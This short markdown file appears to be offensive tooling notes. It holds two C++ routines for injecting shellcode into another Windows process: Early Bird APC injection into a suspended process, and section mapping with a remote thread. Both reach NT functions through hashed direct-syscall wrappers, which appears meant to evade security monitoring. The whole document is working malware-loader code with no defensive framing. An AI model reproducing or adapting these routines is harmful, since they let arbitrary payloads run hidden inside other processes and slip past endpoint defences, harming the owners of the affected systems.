# PI

## EB APC

```cpp
int inject(std::vector<unsigned char> bytecode) {

  SIZE_T bytecodeSize = bytecode.size();
  STARTUPINFOEXA sie;
  PROCESS_INFORMATION pi;
  ZeroMemory(&sie, sizeof(sie));
  ZeroMemory(&pi, sizeof(pi));
  sie.StartupInfo.cb = sizeof(STARTUPINFOEXA);
  sie.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

  PVOID baseAddress = nullptr;

  SIZE_T attrListSize = 0;
  InitializeProcThreadAttributeList(nullptr, 1, 0, &attrListSize);
  sie.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrListSize);
  InitializeProcThreadAttributeList(sie.lpAttributeList, 1, 0, &attrListSize);


  BOOL cpStatus = CreateProcessA(
    (LPSTR)TARGET_PROCESS,
    nullptr, nullptr, nullptr,
    FALSE,
    EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
    nullptr, nullptr,
    (LPSTARTUPINFOA)&sie.StartupInfo,
    &pi
  );

  HANDLE hProcess = pi.hProcess;
  HANDLE hThread  = pi.hThread;

  auto cleanup = [&]() {
    TerminateProcess(hProcess, 0);
  };

  NTSTATUS allocStatus = call(
    hashNtDll,
    hashNtAllocateVirtualMemory,
    sysNtAllocateVirtualMemory,

    hProcess,
    &baseAddress,
    0,
    &bytecodeSize,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE
  );

  NTSTATUS writeStatus = call(
    hashNtDll,
    hashNtWriteVirtualMemory,
    sysNtWriteVirtualMemory,

    hProcess,
    baseAddress,
    bytecode.data(),
    bytecodeSize,
    nullptr
  );

  DWORD oldProtect = 0;

  NTSTATUS protectStatus = call(
    hashNtDll,
    hashNtProtectVirtualMemory,
    sysNtProtectVirtualMemory,

    hProcess,
    &baseAddress,
    &bytecodeSize,
    PAGE_EXECUTE_READ,
    &oldProtect
  );

  NTSTATUS queueApcStatus = call(
    hashNtDll,
    hashNtQueueApcThread,
    sysNtQueueApcThread,

    hThread,
    (PIO_APC_ROUTINE)baseAddress,
    baseAddress,
    (PIO_STATUS_BLOCK)nullptr,
    NULL
  );

  DWORD ret = ResumeThread(hThread);

  return 0;

}
```

## via NtCreateSection,NtMapViewOfSection

```cpp
int inject(std::vector<unsigned char> bytecode) {

  HANDLE hSection = NULL;
  SIZE_T size = bytecode.size();
  LARGE_INTEGER sectionMaxSize;
  sectionMaxSize.QuadPart = size;
  PVOID localSectionBase = NULL;
  PVOID remoteSectionBase = NULL;

  NTSTATUS createSectionStatus = call(
    hashNtDll,
    hashNtCreateSection,
    sysNtCreateSection,

    &hSection,
    SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
    nullptr,
    &sectionMaxSize,
    PAGE_EXECUTE_READWRITE,
    SEC_COMMIT,
    (HANDLE)NULL
  );

  HANDLE hCurrentProcess = GetCurrentProcess();
  NTSTATUS localMapStatus = call(
    hashNtDll,
    hashNtMapViewOfSection,
    sysNtMapViewOfSection,

    hSection,
    hCurrentProcess,
    &localSectionBase,
    (ULONG_PTR)NULL,
    (SIZE_T)NULL,
    (PLARGE_INTEGER)NULL,
    &size,
    (SECTION_INHERIT)2,
    (ULONG)NULL,
    PAGE_READWRITE
  );

  DWORD targetProcessId = findProcessId(TARGET_PROCESS);

  HANDLE hTargetProcess = OpenProcess(
    PROCESS_ALL_ACCESS,
    false,
    targetProcessId
  );

  NTSTATUS remoteMapStatus = call(
    hashNtDll,
    hashNtMapViewOfSection,
    sysNtMapViewOfSection,

    hSection,
    hTargetProcess,
    &remoteSectionBase,
    (ULONG_PTR)NULL,
    (SIZE_T)NULL,
    (PLARGE_INTEGER)NULL,
    &size,
    (SECTION_INHERIT)2,
    (ULONG)NULL,
    PAGE_EXECUTE_READ
  );

  memcpy(localSectionBase, bytecode.data(), bytecode.size());

  HANDLE hTargetThread = NULL;
  NTSTATUS threadStatus = call(
    hashNtDll,
    hashNtCreateThreadEx,
    sysNtCreateThreadEx,

    &hTargetThread,
    THREAD_ALL_ACCESS,
    (PCOBJECT_ATTRIBUTES)NULL,
    hTargetProcess,
    (PUSER_THREAD_START_ROUTINE)remoteSectionBase,
    (PVOID)NULL,
    0,
    0,
    0,
    0,
    (PPS_ATTRIBUTE_LIST)NULL
  );

  return 0;
}
```
